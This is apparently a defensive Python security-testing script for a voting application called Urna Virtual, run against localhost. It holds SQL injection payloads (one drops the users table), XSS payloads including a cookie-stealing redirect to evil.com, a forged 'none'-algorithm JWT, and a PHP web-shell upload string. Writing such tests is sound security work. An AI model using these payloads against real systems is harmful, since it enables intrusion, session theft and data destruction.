#!/usr/bin/env python3
"""
Script de Pruebas de Penetración y Seguridad Avanzada
Urna Virtual - Sistema de Votación Electrónica
"""

import requests
import json
import time
import hashlib
import base64
import jwt
import random
import string
from urllib.parse import urljoin, quote
import threading
from concurrent.futures import ThreadPoolExecutor

class SecurityTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.test_results = {
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0,
            "info": 0
        }
    
    def log_vulnerability(self, severity, title, description, evidence=""):
        """Registra una vulnerabilidad encontrada"""
        vuln = {
            "severity": severity,
            "title": title,
            "description": description,
            "evidence": evidence,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.vulnerabilities.append(vuln)
        self.test_results[severity] += 1
        print(f"🚨 [{severity.upper()}] {title}")
        if evidence:
            print(f"   Evidence: {evidence}")
    
    def test_information_disclosure(self):
        """Pruebas de divulgación de información"""
        print("\n🔍 Testing Information Disclosure...")
        
        # Test error messages
        endpoints = [
            "/api/v1/nonexistent",
            "/api/v1/users/999999",
            "/api/v1/tenants/invalid-id",
            "/admin",
            "/.env",
            "/config.json",
            "/backup.sql"
        ]
        
        for endpoint in endpoints:
            try:
                response = self.session.get(urljoin(self.base_url, endpoint))
                
                # Check for sensitive information in responses
                sensitive_patterns = [
                    "database", "password", "secret", "key", "token",
                    "internal", "debug", "stack trace", "exception",
                    "mysql", "postgresql", "mongodb", "redis"
                ]
                
                response_text = response.text.lower()
                for pattern in sensitive_patterns:
                    if pattern in response_text:
                        self.log_vulnerability(
                            "medium",
                            "Information Disclosure",
                            f"Sensitive information '{pattern}' found in response",
                            f"Endpoint: {endpoint}, Status: {response.status_code}"
                        )
                        break
                        
            except Exception as e:
                continue
    
    def test_authentication_bypass(self):
        """Pruebas de bypass de autenticación"""
        print("\n🔐 Testing Authentication Bypass...")
        
        # Test SQL injection in login
        sql_payloads = [
            "admin@test.com' OR '1'='1' --",
            "admin@test.com'; DROP TABLE users; --",
            "admin@test.com' UNION SELECT 1,2,3,4,5 --",
            "' OR 1=1 --",
            "admin' --",
            "admin'/*",
            "admin' OR 'x'='x",
            "admin') OR ('x'='x"
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/api/v1/auth/login"),
                    json={"email": payload, "password": "test"}
                )
                
                if response.status_code == 200:
                    self.log_vulnerability(
                        "critical",
                        "SQL Injection in Authentication",
                        "Authentication bypass possible via SQL injection",
                        f"Payload: {payload}"
                    )
                elif "error" not in response.text.lower():
                    self.log_vulnerability(
                        "medium",
                        "Potential SQL Injection",
                        "Unusual response to SQL injection payload",
                        f"Payload: {payload}, Status: {response.status_code}"
                    )
                    
            except Exception as e:
                continue
    
    def test_jwt_vulnerabilities(self):
        """Pruebas de vulnerabilidades en JWT"""
        print("\n🎫 Testing JWT Vulnerabilities...")
        
        # First get a valid token
        try:
            response = self.session.post(
                urljoin(self.base_url, "/api/v1/auth/login"),
                json={"email": "admin@test.com", "password": "password123"}
            )
            
            if response.status_code != 200:
                print("   ⚠️ Cannot get valid token for JWT testing")
                return
                
            token = response.json().get("access_token")
            if not token:
                return
            
            # Test 1: None algorithm attack
            try:
                header = {"alg": "none", "typ": "JWT"}
                payload = {"sub": "1", "role": "SUPER_ADMIN"}
                
                encoded_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                encoded_payload = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                
                malicious_token = f"{encoded_header}.{encoded_payload}."
                
                test_response = self.session.get(
                    urljoin(self.base_url, "/api/v1/auth/me"),
                    headers={"Authorization": f"Bearer {malicious_token}"}
                )
                
                if test_response.status_code == 200:
                    self.log_vulnerability(
                        "critical",
                        "JWT None Algorithm Attack",
                        "JWT accepts 'none' algorithm allowing token forgery",
                        f"Malicious token accepted"
                    )
                    
            except Exception as e:
                pass
            
            # Test 2: Weak secret brute force simulation
            weak_secrets = ["secret", "123456", "password", "jwt", "key"]
            
            for secret in weak_secrets:
                try:
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    self.log_vulnerability(
                        "high",
                        "Weak JWT Secret",
                        "JWT secret is weak and can be brute forced",
                        f"Secret: {secret}"
                    )
                    break
                except:
                    continue
                    
        except Exception as e:
            print(f"   ⚠️ JWT testing failed: {e}")
    
    def test_injection_attacks(self):
        """Pruebas de ataques de inyección"""
        print("\n💉 Testing Injection Attacks...")
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "<script>document.location='http://evil.com/'+document.cookie</script>"
        ]
        
        # Test XSS in tenant creation (if we have admin access)
        for payload in xss_payloads:
            try:
                # Try to create tenant with XSS payload
                response = self.session.post(
                    urljoin(self.base_url, "/api/v1/tenants/"),
                    json={
                        "name": payload,
                        "domain": "test.com",
                        "country": "ES",
                        "timezone": "Europe/Madrid"
                    }
                )
                
                if response.status_code == 201:
                    # Check if payload is reflected without encoding
                    response_text = response.text
                    if payload in response_text and "<script>" in response_text:
                        self.log_vulnerability(
                            "high",
                            "Stored XSS Vulnerability",
                            "XSS payload stored and reflected without encoding",
                            f"Payload: {payload}"
                        )
                        
            except Exception as e:
                continue
    
    def test_rate_limiting(self):
        """Pruebas de rate limiting"""
        print("\n⏱️ Testing Rate Limiting...")
        
        # Test login rate limiting
        failed_attempts = 0
        blocked_attempts = 0
        
        for i in range(10):
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/api/v1/auth/login"),
                    json={"email": "admin@test.com", "password": "wrongpassword"}
                )
                
                if response.status_code == 429:
                    blocked_attempts += 1
                elif response.status_code == 401:
                    failed_attempts += 1
                    
                time.sleep(0.1)  # Small delay between requests
                
            except Exception as e:
                continue
        
        if blocked_attempts == 0:
            self.log_vulnerability(
                "medium",
                "Insufficient Rate Limiting",
                "No rate limiting detected on login endpoint",
                f"Made 10 requests, {blocked_attempts} blocked"
            )
        elif blocked_attempts < 5:
            self.log_vulnerability(
                "low",
                "Weak Rate Limiting",
                "Rate limiting is present but may be too permissive",
                f"Made 10 requests, {blocked_attempts} blocked"
            )
    
    def test_session_management(self):
        """Pruebas de gestión de sesiones"""
        print("\n🔑 Testing Session Management...")
        
        # Test session fixation
        try:
            # Get initial session
            response1 = self.session.post(
                urljoin(self.base_url, "/api/v1/auth/login"),
                json={"email": "admin@test.com", "password": "password123"}
            )
            
            if response1.status_code == 200:
                token1 = response1.json().get("access_token")
                
                # Login again and check if token changes
                response2 = self.session.post(
                    urljoin(self.base_url, "/api/v1/auth/login"),
                    json={"email": "admin@test.com", "password": "password123"}
                )
                
                if response2.status_code == 200:
                    token2 = response2.json().get("access_token")
                    
                    if token1 == token2:
                        self.log_vulnerability(
                            "medium",
                            "Session Fixation",
                            "Same token returned for multiple logins",
                            "Tokens should be regenerated on each login"
                        )
                        
        except Exception as e:
            print(f"   ⚠️ Session testing failed: {e}")
    
    def test_business_logic(self):
        """Pruebas de lógica de negocio"""
        print("\n🏢 Testing Business Logic...")
        
        # Test voting multiple times (if we can get voter access)
        try:
            # This would require setting up a test election and voter
            # For now, we'll test the concept
            
            # Test: Can a user vote multiple times?
            # Test: Can a user vote in elections they're not eligible for?
            # Test: Can election dates be manipulated?
            # Test: Can vote counts be manipulated?
            
            print("   ℹ️ Business logic tests require specific test data setup")
            
        except Exception as e:
            print(f"   ⚠️ Business logic testing failed: {e}")
    
    def test_security_headers(self):
        """Pruebas de headers de seguridad"""
        print("\n📋 Testing Security Headers...")
        
        try:
            response = self.session.get(urljoin(self.base_url, "/health"))
            headers = response.headers
            
            required_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": None,  # Should contain max-age
                "Content-Security-Policy": None,    # Should be present
            }
            
            for header, expected in required_headers.items():
                if header not in headers:
                    self.log_vulnerability(
                        "low",
                        f"Missing Security Header: {header}",
                        f"Security header {header} is not present",
                        f"Response headers: {dict(headers)}"
                    )
                elif expected and isinstance(expected, list):
                    if headers[header] not in expected:
                        self.log_vulnerability(
                            "low",
                            f"Weak Security Header: {header}",
                            f"Security header {header} has weak value",
                            f"Current: {headers[header]}, Expected: {expected}"
                        )
                        
        except Exception as e:
            print(f"   ⚠️ Security headers testing failed: {e}")
    
    def test_file_upload_vulnerabilities(self):
        """Pruebas de vulnerabilidades en carga de archivos"""
        print("\n📁 Testing File Upload Vulnerabilities...")
        
        # Test malicious file uploads (if file upload is available)
        malicious_files = [
            ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("script.js", "alert('XSS')", "application/javascript"),
            ("config.conf", "admin:password", "text/plain"),
            ("test.svg", "<svg onload=alert('XSS')></svg>", "image/svg+xml")
        ]
        
        # This would test candidate photo uploads or other file upload endpoints
        print("   ℹ️ File upload tests require specific endpoint identification")
    
    def run_all_tests(self):
        """Ejecuta todas las pruebas de seguridad"""
        print("🚀 Starting Advanced Security Testing...")
        print("=" * 60)
        
        test_methods = [
            self.test_information_disclosure,
            self.test_authentication_bypass,
            self.test_jwt_vulnerabilities,
            self.test_injection_attacks,
            self.test_rate_limiting,
            self.test_session_management,
            self.test_business_logic,
            self.test_security_headers,
            self.test_file_upload_vulnerabilities
        ]
        
        for test_method in test_methods:
            try:
                test_method()
            except Exception as e:
                print(f"   ❌ Test failed: {e}")
            
        self.generate_report()
    
    def generate_report(self):
        """Genera reporte de resultados"""
        print("\n" + "=" * 60)
        print("🔒 SECURITY TESTING REPORT")
        print("=" * 60)
        
        print(f"\n📊 VULNERABILITY SUMMARY:")
        print(f"   Critical: {self.test_results['critical']}")
        print(f"   High:     {self.test_results['high']}")
        print(f"   Medium:   {self.test_results['medium']}")
        print(f"   Low:      {self.test_results['low']}")
        print(f"   Info:     {self.test_results['info']}")
        
        total_vulns = sum(self.test_results.values())
        print(f"\n   Total Vulnerabilities: {total_vulns}")
        
        if total_vulns == 0:
            print("\n✅ NO VULNERABILITIES FOUND!")
            print("   System appears to be secure against tested attack vectors.")
        else:
            print(f"\n⚠️ {total_vulns} VULNERABILITIES FOUND")
            
        # Calculate security score
        score = 100
        score -= self.test_results['critical'] * 25
        score -= self.test_results['high'] * 15
        score -= self.test_results['medium'] * 10
        score -= self.test_results['low'] * 5
        score -= self.test_results['info'] * 1
        score = max(0, score)
        
        print(f"\n🎯 SECURITY SCORE: {score}/100")
        
        if score >= 90:
            print("   🟢 EXCELLENT - Production ready")
        elif score >= 75:
            print("   🟡 GOOD - Minor issues to address")
        elif score >= 50:
            print("   🟠 FAIR - Several issues need attention")
        else:
            print("   🔴 POOR - Major security issues found")
        
        if self.vulnerabilities:
            print(f"\n📋 DETAILED FINDINGS:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. [{vuln['severity'].upper()}] {vuln['title']}")
                print(f"   Description: {vuln['description']}")
                if vuln['evidence']:
                    print(f"   Evidence: {vuln['evidence']}")
                print(f"   Found at: {vuln['timestamp']}")

if __name__ == "__main__":
    print("🔒 Urna Virtual - Advanced Security Testing")
    print("=" * 50)
    
    tester = SecurityTester()
    tester.run_all_tests()

